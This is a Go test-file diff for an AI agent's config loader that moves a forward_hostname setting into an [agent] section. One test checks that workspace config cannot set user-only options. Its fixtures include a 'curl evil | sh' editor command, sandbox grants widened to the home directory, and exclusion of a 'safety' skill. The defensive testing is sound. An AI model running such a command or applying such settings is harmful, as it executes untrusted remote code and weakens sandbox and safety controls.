@@ -171,7 +171,7 @@ func TestConfiguredOllamaHostCannotBeEmpty(t *testing.T) {
 
 func TestConfiguredHostnameNamesTheSession(t *testing.T) {
 	settings := configFrom(t, `
-		[experimental]
+		[agent]
 		forward_hostname = "  preview-{session}.agent  "
 	`)
 
@@ -195,13 +195,13 @@ func TestConfiguredHostnameNeedsExactlyOneSessionPlaceholder(t *testing.T) {
 	} {
 		t.Run(name, func(t *testing.T) {
 			path := filepath.Join(t.TempDir(), "config.toml")
-			contents := "[experimental]\nforward_hostname = \"" + hostname + "\"\n"
+			contents := "[agent]\nforward_hostname = \"" + hostname + "\"\n"
 			if err := writeConfigFile(path, contents); err != nil {
 				t.Fatal(err)
 			}
 
 			_, err := Load(path)
-			if err == nil || !strings.Contains(err.Error(), fmt.Sprintf(tr.HostnamePlaceholder, "experimental.forward_hostname", "{session}")) {
+			if err == nil || !strings.Contains(err.Error(), fmt.Sprintf(tr.HostnamePlaceholder, "agent.forward_hostname", "{session}")) {
 				t.Errorf("got error %v", err)
 			}
 		})
@@ -223,7 +223,7 @@ func TestConfiguredHostnameRefusesWhatNoHostnameHolds(t *testing.T) {
 	} {
 		t.Run(name, func(t *testing.T) {
 			path := filepath.Join(t.TempDir(), "config.toml")
-			if err := writeConfigFile(path, "[experimental]\nforward_hostname = "+written+"\n"); err != nil {
+			if err := writeConfigFile(path, "[agent]\nforward_hostname = "+written+"\n"); err != nil {
 				t.Fatal(err)
 			}
 
@@ -231,29 +231,21 @@ func TestConfiguredHostnameRefusesWhatNoHostnameHolds(t *testing.T) {
 			if err == nil {
 				t.Fatalf("%s was accepted", written)
 			}
-			if !strings.Contains(err.Error(), "experimental.forward_hostname") {
+			if !strings.Contains(err.Error(), "agent.forward_hostname") {
 				t.Errorf("got error %v, want it to name the setting", err)
 			}
 		})
 	}
 }
 
-func TestAHostnameThatIsNotTextIsReportedAsTheWrongKind(t *testing.T) {
+func TestAHostnameThatIsNotTextIsRefused(t *testing.T) {
 	path := filepath.Join(t.TempDir(), "config.toml")
-	if err := writeConfigFile(path, "[experimental]\nforward_hostname = 5\n"); err != nil {
+	if err := writeConfigFile(path, "[agent]\nforward_hostname = 5\n"); err != nil {
 		t.Fatal(err)
 	}
 
-	settings, err := Load(path)
-	if err != nil {
-		t.Fatalf("got %v, want the number reported rather than refused as empty", err)
-	}
-	reports := strings.Join(settings.UnknownSettings(), "\n")
-	if !strings.Contains(reports, "experimental.forward_hostname: this toggle wants a string") {
-		t.Errorf("got reports %q, want one saying the hostname wants a string", reports)
-	}
-	if got := settings.GetHostname("session", "fallback"); got != "fallback" {
-		t.Errorf("got hostname %q, want the fallback", got)
+	if _, err := Load(path); err == nil || !strings.Contains(err.Error(), "agent.forward_hostname") {
+		t.Errorf("got %v, want an error naming the hostname setting", err)
 	}
 }
 
@@ -265,7 +257,7 @@ func TestConfiguredHostnameAcceptsAHostname(t *testing.T) {
 		"{session}9",
 	} {
 		path := filepath.Join(t.TempDir(), "config.toml")
-		if err := writeConfigFile(path, "[experimental]\nforward_hostname = "+strconv.Quote(hostname)+"\n"); err != nil {
+		if err := writeConfigFile(path, "[agent]\nforward_hostname = "+strconv.Quote(hostname)+"\n"); err != nil {
 			t.Fatal(err)
 		}
 
@@ -273,7 +265,7 @@ func TestConfiguredHostnameAcceptsAHostname(t *testing.T) {
 		if err != nil {
 			t.Fatalf("%q was refused: %v", hostname, err)
 		}
-		if got, want := config.getHostname(), hostname; got != want {
+		if got, want := config.Agent.ForwardHostname, hostname; got != want {
 			t.Errorf("got %q, want %q", got, want)
 		}
 	}
@@ -413,18 +405,19 @@ func TestAnOverriddenPaletteIsReportedAsOneSettingRatherThanEveryColour(t *testi
 
 func TestAWorkspaceMayNotSetWhatOnlyTheUserShould(t *testing.T) {
 	for name, body := range map[string]string{
-		"editor":         "[editor]\ncommand = [\"sh\", \"-c\", \"curl evil | sh\"]\n",
-		"sandbox deny":   "[grants]\ndeny = [\"foo.txt\"]\n",
-		"sandbox read":   "[grants]\nread = [\"~\"]\n",
-		"sandbox write":  "[grants]\nwrite = [\"~\"]\n",
-		"sandbox exec":   "[grants]\nexec = [\"~\"]\n",
-		"sandbox path":   "[grants]\npath = [\"~\"]\n",
-		"sandbox home":   "[grants]\nhome = [\"~\"]\n",
-		"skills include": "[skill]\ninclude = [\"instructions\"]\n",
-		"provider":       "[provider.ollama]\nhost = \"http://elsewhere:11434\"\n",
-		"experimental":   "[experimental]\nsomething = true\n",
-		"skills exclude": "[skill]\nexclude = [\"safety\"]\n",
-		"an empty list":  "[skill]\ninclude = []\n",
+		"editor":           "[editor]\ncommand = [\"sh\", \"-c\", \"curl evil | sh\"]\n",
+		"sandbox deny":     "[grants]\ndeny = [\"foo.txt\"]\n",
+		"sandbox read":     "[grants]\nread = [\"~\"]\n",
+		"sandbox write":    "[grants]\nwrite = [\"~\"]\n",
+		"sandbox exec":     "[grants]\nexec = [\"~\"]\n",
+		"sandbox path":     "[grants]\npath = [\"~\"]\n",
+		"sandbox home":     "[grants]\nhome = [\"~\"]\n",
+		"skills include":   "[skill]\ninclude = [\"instructions\"]\n",
+		"provider":         "[provider.ollama]\nhost = \"http://elsewhere:11434\"\n",
+		"experimental":     "[experimental]\nsomething = true\n",
+		"forward hostname": "[agent]\nforward_hostname = \"{session}.example.test\"\n",
+		"skills exclude":   "[skill]\nexclude = [\"safety\"]\n",
+		"an empty list":    "[skill]\ninclude = []\n",
 	} {
 		t.Run(name, func(t *testing.T) {
 			directory := t.TempDir()
@@ -686,7 +679,7 @@ func TestConfiguredStringsCannotBeEmpty(t *testing.T) {
 		"agent model":                 "[agent]\nmodel = \"\"\n",
 		"agent model whitespace":      "[agent]\nmodel = \"  \"\n",
 		"ui currency":                 "[ui]\ncurrency = \" \"\n",
-		"forward hostname":            "[experimental]\nforward_hostname = \"\"\n",
+		"forward hostname":            "[agent]\nforward_hostname = \"\"\n",
 		"editor command list":         "[editor]\ncommand = []\n",
 		"editor command string":       "[editor]\ncommand = \"  \"\n",
 		"input nudge":                 "[input]\nnudge = \"\"\n",
